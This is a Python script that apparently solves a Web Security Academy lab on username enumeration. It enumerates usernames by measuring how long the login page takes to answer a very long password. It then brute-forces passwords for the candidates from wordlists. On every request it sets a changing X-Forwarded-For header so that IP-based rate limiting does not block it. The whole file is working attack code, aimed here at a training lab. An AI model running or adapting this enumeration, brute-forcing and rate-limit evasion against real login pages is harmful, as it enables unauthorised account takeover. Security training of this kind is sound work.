from http import HTTPStatus
from pathlib import Path

import typer
import requests
from lxml import html
from rich.console import Console
from rich.progress import Progress
from rich.progress import track
from rich.theme import Theme
custom_theme = Theme({
    "info": "green",
    "warning": "yellow",
    "danger": "bold red"
})
console = Console(theme=custom_theme)


app = typer.Typer()



@app.command()
def run():
    lab_id= '0acf0036030e70d385dc80c9004a00ac'
    time_limit=0.8
    possible_usernames = []

    header_to_bypass_IP_block = 'X-Forwarded-For'
    
    username = 'user'
    password='709d49e4-a272-11ee-8c90-0242ac120002709d49e4-a272-11ee-8c90-0242ac120002709d49e4-a272-11ee-8c90-0242ac120002709d49e4-a272-11ee-8c90-0242ac120002709d49e4-a272-11ee-8c90-0242ac120002709d49e4-a272-11ee-8c90-0242ac120002'

    # The code block you provided is reading a file named "usernames.txt" and iterating over each line
    # in the file. It sends a POST request to a specific URL with each username as a parameter. The
    # response from the request is then checked for the elapsed time. If the elapsed time is greater
    # than a specified time limit, it prints a message indicating a possible username and adds the
    # username to a list called `possible_usernames`. The progress of the iteration is also tracked
    # using the `Progress` class from the `rich.progress` module.
    with open("usernames.txt", "r") as file:
        file_lines = file.readlines()
        file_length = len(file_lines)
        with Progress() as progress:
            task = progress.add_task("Usernames fuzzing...", total=file_length) 
            for username in file_lines:
                #print(username)
                username=username.strip()
        
                if not username:
                    break
                response = requests.post(
                                        f"https://{lab_id}.web-security-academy.net/login", data= {
                                            "username" : username,
                                            "password": password
                                        }, headers={
                                            "host": f"{lab_id}.web-security-academy.net",
                                            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",

                                            "Referer": f"https://{lab_id}.web-security-academy.net/login",
                                            # The line `header_to_bypass_IP_block: username.strip()`
                                            # is adding a custom header to the HTTP request in order
                                            # to bypass IP blocking. The value of
                                            # `header_to_bypass_IP_block` is set to
                                            # `'X-Forwarded-For'`, which is a commonly used header for
                                            # specifying the client's IP address in an HTTP request.
                                            header_to_bypass_IP_block: username.strip()
                                        })
        
                response_text = response.text
                #print(response_text)
                #print(f'{response.elapsed.total_seconds()}: {username}')
                if response.elapsed.total_seconds() > time_limit:
                    console.print(f'\npossible username found (time > {time_limit}s ): {username}', style="warning")
                    #progress.update(task, advance=file_length)
                    possible_usernames.append(username)                    

                
                progress.update(task, advance=1)
    
    console.print(f'\n Possible candidate usernames {possible_usernames}', style="warning")



    logged_in_string = "Your username is:"

    # The code block you provided is iterating over each username in the `possible_usernames` list.
    # For each username, it opens a file named "passwords.txt" and reads its contents. It then
    # calculates the length of the file (number of lines) and initializes a progress bar using the
    # `Progress` class.
    for username in possible_usernames:
        #print(username)
        with open("passwords.txt", "r") as file:
            file_lines = file.readlines()
            file_length = len(file_lines)
            with Progress() as progress:
                task = progress.add_task(f"Password fuzzing for {username} ...", total=file_length) 
                for password in file_lines:
                    #print(username)
                    password=password.strip()
            
                   
                    if not password:
                        break
                    # The code block you provided is making a POST request to a specific URL
                    # (`https://{lab_id}.web-security-academy.net/login`) with the `username` and
                    # `password` as data parameters. It also includes additional headers in the
                    # request, such as the `host`, `User-Agent`, and `Referer`. The
                    # `header_to_bypass_IP_block` header is also included, with the value set to the
                    # `password.strip()`.
                    response = requests.post(
                                            f"https://{lab_id}.web-security-academy.net/login", data= {
                                                "username" : username,
                                                "password": password
                                            }, headers={
                                                "host": f"{lab_id}.web-security-academy.net",
                                                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",

                                                "Referer": f"https://{lab_id}.web-security-academy.net/login",
                                                header_to_bypass_IP_block : password
                                            })
            
                    response_text = response.text
                # print(response.text)
                    if logged_in_string in response_text:
                        console.print(f'\nleaked credentials', style='warning')
                        console.print(f'{username}:{password}', style="danger")
                        progress.update(task, advance=file_length)
                        break
                        
                        #user_found=True

                    else:
                        progress.update(task, advance=1)
            


                

    
    
    



    

  

    

if __name__ == "__main__":
    app()
